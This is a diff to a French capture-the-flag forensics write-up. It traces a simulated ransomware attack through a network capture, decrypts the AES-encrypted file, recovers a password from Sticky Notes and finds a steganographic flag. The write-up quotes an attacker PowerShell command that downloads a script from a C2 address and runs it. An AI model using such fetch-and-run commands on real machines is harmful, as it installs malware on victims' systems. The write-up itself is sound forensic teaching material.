@@ -54,7 +54,7 @@ Fichiers donnés :
 
 - Utilisation de l'outil [Wireshark](https://www.wireshark.org/)
 
-Grâce à la partie précédente, on a le C2 (Command and Control) du groupe **THE HARMOR** : 172.21.195.17
+Grâce à la partie précédente, on a le C2 (Command and Control) du groupe **THE HARMOR** : 172.21.195.17. On sait également qu'il utilise le protocol `http`
 
 ````powershell
 IGotYourFileInfo - [Invoke-WebRequest :: -Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1] (Author)
@@ -63,7 +63,12 @@ IGotYourFileInfo - [Invoke-WebRequest :: -Uri http://172.21.195.17:5000/Holmes/G
 On filtre sur le C2 de l'attaquant ainsi que sur le protocole http 
  `ip.addr == 172.21.195.17 and http` sur wireshark
 
-On récupère ainsi les scripts malveillants.
+On récupère ainsi tous les scripts et fichiers :
+
+- `Enigma.ps1` : Script initial permettant de télécharger et ouvrir le pdf, de créer la tâche planifiée, de chiffre le file system, de changer le fond d'écran et enfin d'afficher les instructions.
+- `Encrypt.ps1` : Chiffre le FS
+- `key.txt`
+
 Le script qui nous intéresse est `Encrypt.ps1`
 
 172.21.195.17	HTTP	GET /Holmes/Encrypt.ps1 HTTP/1.1 
@@ -131,7 +136,7 @@ foreach ($dir in $directories) {
 Les informations clés du script : 
 
 - Algorithme de Rijndael (AES)
-- La clef `key.txt` est récupérable dans le dump réseau
+- La clef `key.txt` récupérable dans le dump réseau est la clef utilisée.
 - L'IV est présent dans le système de fichiers de l'utilisateur depuis `$env:USERPROFILE\Documents\iv`
 
 ### Déchiffrement du système de fichiers 
@@ -147,7 +152,7 @@ Le fichier importante_recherche.shutlock nous paraît ainsi intéressant.
 └─$ hexdump -C iv
 00000000  a6 2c 18 0d 65 f6 78 23  c9 24 a7 b7 7c 31 a3 cb  |.,..e.x#.$..|1..|
 00000010
-└─$ openssl aes-256-cbc -p -d -nosalt -nopad -K 72d4cfb3b29136d8ac4fd1eb11c8de7e1a6f482b3600c699b677a4e1e5a3b294 -iv a62c180d65f67823c924a7b77c31a3cb -in FileSystem/Documents/Recherche/importante_recherche.shutlock -out importante_recherche.zip
+└─$ openssl aes-256-cbc -p -d -nosalt -nopad -K 72d4cfb3b29136d8ac4fd1eb11c8de7e1a6f482b3600c699b677a4e1e5a3b294 -iv a62c180d65f67823c924a7b77c31a3cb -in FileSystem/Documents/Recherche/importante_recherche.shutlock -out importante_recherche.dec
 ````
 
 #### Deuxième methods : Script
@@ -215,6 +220,9 @@ foreach ($dir in $directories) {
     }
 }
 ```
+#### File
+
+Un simple `file` nous permet de savoir que le fichier en question est un ZIP protégé par un mot de passe.
 
 #### Note
 
@@ -226,10 +234,10 @@ Les autres fichiers hors du dossier `download` ont été généré aléatoiremen
 
 Plusieurs méthodes / artéfacts sont possibles / présents notamment : 
 - Password Looting https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#sticky-notes-passwords
-- `Ordi.png` : on remarque l'application StikyNotes ouvertes.
+- `Ordi.png` : on remarque l'application StikyNotes ouvertes sur la taskbar.
 - `FileSystem\AppData\Roaming\Microsoft\Windows\Recent` : db StickyNotes présente
 
-On récupère la data base : `AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe` 
+On récupère la database : `AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe` 
 Un parseur existe : https://github.com/dingtoffee/StickyParser
 On récupère ainsi le mot de passe : `s3cr3t_r3ch3rch3_pwd_!`
 
@@ -237,8 +245,10 @@ On récupère ainsi le mot de passe : `s3cr3t_r3ch3rch3_pwd_!`
 La scientifique ne voulant pas laisser ses recherches sans protection à rajouter un mot de passe.
 Malheureusement, n'ayant sûrement pas connaissance des gestionnaires de mot de passe, elle utilise l'application SkickyNotes pour stocker son mot de passe.
 
-
 ### Stéganographie sur le jpeg
+
+On se retrouve avec deux fichiers.
+Un `steghide info` nous permet d'apprendre que l'image jpeg contient un fichier caché `flag.txt`.
 
 ````shell
 └─$ steghide info chiffrement.jpeg
